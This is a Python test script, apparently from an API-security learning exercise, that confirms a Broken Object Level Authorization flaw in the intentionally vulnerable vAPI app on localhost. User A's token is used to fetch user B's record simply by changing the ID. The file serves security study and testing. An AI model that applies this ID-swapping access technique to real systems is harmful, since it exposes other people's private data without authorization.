import base64
import requests

BASE_URL = "http://localhost:8000/vapi/api1/user"


def create_user(username, name, course, password):
    """Helper: naya user banata hai aur uska JSON response deta hai."""
    payload = {
        "username": username,
        "name": name,
        "course": course,
        "password": password,
    }
    response = requests.post(BASE_URL, json=payload)
    return response.json()


def get_auth_token(username, password):
    """
    vAPI ka Authorization-Token header banata hai: base64("username:password").
    Yeh Postman automatically banata hai - hum yahan Python mein replicate kar rahe hain.
    """
    raw = f"{username}:{password}"
    return base64.b64encode(raw.encode()).decode()


def test_bola_user_can_access_another_users_data():
    """
    BOLA (Broken Object Level Authorization) test - OWASP API1 / A01:2021.

    User A apne khud ke valid credentials se authenticate hota hai
    (Authorization-Token header ke through), lekin phir User B ka
    data maangta hai URL mein sirf ID badal kar. App ownership
    check nahi karta - sirf yeh check karta hai ki token valid hai.

    NOTE: vAPI jaan-bujh kar vulnerable app hai. Yahan test ka PASS
    hona 'vulnerability confirmed' hai - real production app mein
    hum ulta chahenge (unauthorized access pe test FAIL ho).
    """
    password = "pass123"
    user_a = create_user("bola_auto_a2", "BOLA Auto A2", "API", password)
    user_b = create_user("bola_auto_b2", "BOLA Auto B2", "API", password)

    user_a_token = get_auth_token(user_a["username"], password)
    user_b_id = user_b["id"]

    headers = {"Authorization-Token": user_a_token}
    response = requests.get(f"{BASE_URL}/{user_b_id}", headers=headers)

    assert response.status_code == 200, (
        f"Expected 200, got {response.status_code}. "
        f"Agar 403 mila, iska matlab app ne authorization check kar liya."
    )
    data = response.json()
    assert data["id"] == user_b_id, "Expected User B's data (proving BOLA)"

    print(f"\n[VULNERABILITY CONFIRMED] BOLA / OWASP API1: "
          f"User A's own token accessed User B's (id={user_b_id}) data "
          f"without ownership check. Response: {data}")

